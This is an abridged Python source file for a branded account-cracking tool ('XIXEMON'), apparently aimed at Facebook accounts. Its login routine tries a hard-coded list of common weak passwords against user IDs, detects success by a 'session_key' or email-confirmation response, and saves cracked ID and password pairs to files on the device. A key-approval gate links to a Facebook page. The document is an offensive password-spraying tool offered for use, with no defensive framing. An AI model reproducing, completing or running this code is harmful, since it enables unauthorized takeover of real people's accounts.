...
#----------------------------[LOGO]-----------------------------------#
logo = f"""{g}
\x1b[1;31m   LOGO DEI NAI / XIXEMON 
{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{w}
TOOL OWNER    {r}:{w} XIVE XIXEMON
...
def login(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ {g}XIXEMON{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/XIXEMON-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/XIXEMON-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
...
def approval():
    ...
    if keys in raw:
        ...
        os.system("xdg-open https://www.facebook.com/share/154NEezTyJ/")
        sys.exit()
main()
#----------------------------[CODE/END]-----------------------------------#